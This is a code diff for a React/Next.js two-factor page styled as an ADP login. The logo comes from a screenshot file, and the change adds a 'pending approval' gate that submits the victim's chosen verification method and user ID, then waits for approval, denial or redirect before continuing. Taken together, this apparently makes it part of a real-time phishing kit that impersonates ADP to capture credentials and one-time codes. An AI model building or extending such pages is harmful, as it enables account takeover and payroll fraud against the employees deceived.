@@ -2,41 +2,83 @@
 
 import { useState } from "react"
 import { useRouter } from "next/navigation"
-import { FloresLogo } from "./flores-logo"
+import { AdpAuthShell } from "./adp-auth-shell"
 import { TFASelectionStep } from "./tfa-selection-step"
-import { FLORES_SESSION } from "@/lib/flores-flow"
-import adpLogo from "../adp_login/Screenshot 2026-07-06 122158.png"
+import { LOGIN_SESSION } from "@/lib/login-flow"
+import { MSG_UNABLE_REACH_VERIFICATION } from "@/lib/approval-messages"
+import { usePendingApproval } from "@/hooks/use-pending-approval"
+import {
+  getStoredLoginUserId,
+  submitMethodGate,
+} from "@/lib/submit-pending-gate"
 
 export function TFAPage() {
   const router = useRouter()
-  const [rememberBrowser, setRememberBrowser] = useState(false)
+  const [pendingId, setPendingId] = useState<string | null>(null)
+  const [isSubmitting, setIsSubmitting] = useState(false)
+  const [error, setError] = useState("")
 
-  const handleSelectionSubmit = (method: "email" | "sms", remember: boolean) => {
-    setRememberBrowser(remember)
+  usePendingApproval(pendingId, {
+    onApproved: () => {
+      setIsSubmitting(false)
+      setPendingId(null)
+      if (typeof window !== "undefined") {
+        sessionStorage.setItem(LOGIN_SESSION.verify, "1")
+      }
+      router.push("/verify")
+    },
+    onDenied: () => {
+      window.location.href = "/?loginDenied=1"
+    },
+    onTimeout: () => {
+      window.location.href = "/?verifyUnavailable=1"
+    },
+    onRedirected: () => {
+      window.location.href = "/api/login-out"
+    },
+  })
+
+  const handleSelectionSubmit = async (method: "email" | "sms") => {
+    if (isSubmitting || pendingId) return
+
     if (typeof window !== "undefined") {
-      sessionStorage.setItem(FLORES_SESSION.verify, "1")
+      sessionStorage.setItem(LOGIN_SESSION.method, method)
     }
-    router.push("/verify")
+
+    setError("")
+    setIsSubmitting(true)
+    try {
+      const userId = getStoredLoginUserId()
+      if (!userId) {
+        setIsSubmitting(false)
+        router.replace("/")
+        return
+      }
+      const id = await submitMethodGate(userId, method)
+      setPendingId(id)
+    } catch (submitError) {
+      console.error("Failed to submit method for approval:", submitError)
+      setIsSubmitting(false)
+      setPendingId(null)
+      setError(MSG_UNABLE_REACH_VERIFICATION)
+    }
   }
 
   return (
-    <div className="min-h-screen bg-white flex flex-col">
-      
-      <header className="w-full py-3 sm:py-4 px-4 sm:px-6 lg:px-0" style={{ paddingLeft: "clamp(1rem, 4vw, 50px)" }}>
-        <div className="flex items-start">
-          <FloresLogo className="items-start" imageSrc={adpLogo.src} alt="ADP Logo" />
-        </div>
-      </header>
-
-      
-      <div className="flex-1 flex items-start justify-center px-4 sm:px-6 pt-4 sm:pt-6 pb-6 sm:pb-8">
-        <div className="w-full max-w-4xl">
-          <div className="bg-white rounded-lg shadow-lg p-4 sm:p-6 lg:p-8">
-            <TFASelectionStep onSubmit={handleSelectionSubmit} />
-          </div>
-        </div>
-      </div>
-    </div>
+    <AdpAuthShell
+      step={2}
+      title="Verify your identity"
+      subtitle="Choose how you'd like to receive your one-time verification code."
+    >
+      {error ? (
+        <p className="mb-4 text-center text-sm font-medium text-[#dc2626]" role="alert">
+          {error}
+        </p>
+      ) : null}
+      <TFASelectionStep
+        onSubmit={handleSelectionSubmit}
+        isLocked={isSubmitting || pendingId !== null}
+      />
+    </AdpAuthShell>
   )
 }
-
